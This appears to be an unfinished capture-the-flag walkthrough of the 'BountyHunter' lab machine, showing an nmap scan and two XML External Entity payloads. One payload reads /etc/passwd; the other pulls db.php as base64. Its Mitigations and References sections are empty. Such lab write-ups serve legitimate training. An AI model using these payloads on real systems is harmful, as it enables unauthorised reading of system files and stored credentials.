
# BountyHunter

- Hints
- Walkthrough
- Mitigrations
- References

## Hints

# User

1. Find the right wordlist.

# Root

3. Expand and look deeper.


## BountyHunter

The tester started with an nmap scan to identify the open ports:


```
└──╼ $nmap -p 22,80 -A 10.10.11.100 -oA BountyHunter_service
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 12:29 EST
Nmap scan report for 10.10.11.100
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
┌─[rang3r@parrot]─[~/Projects/machines/BountyHunter]
```

The tester browsed to the web page "http://10.10.11.100/log_submit.php" which contained a service for reporting bug bounties. The tester tested and discovered that this logging system is vulnerble to XML External Entity Injection. 
This allowed the tester to create a custom entities and reference it in the request.



{image of the test}




This enabled the tester to read local files, which the testered by viewing the passwd file.



```
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE email [
 	<!ENTITY test SYSTEM "file:///etc/passwd">
	]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

{image of the passwd file}


The tester used the ffuf tool to discover the web sites pages.


The tester viewed the db.php view using a modified version of the payload. As the file was a php file it needed to be encoded in base64.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE email [
 	<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=db.php">
	]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```


## Mitigations 

## References
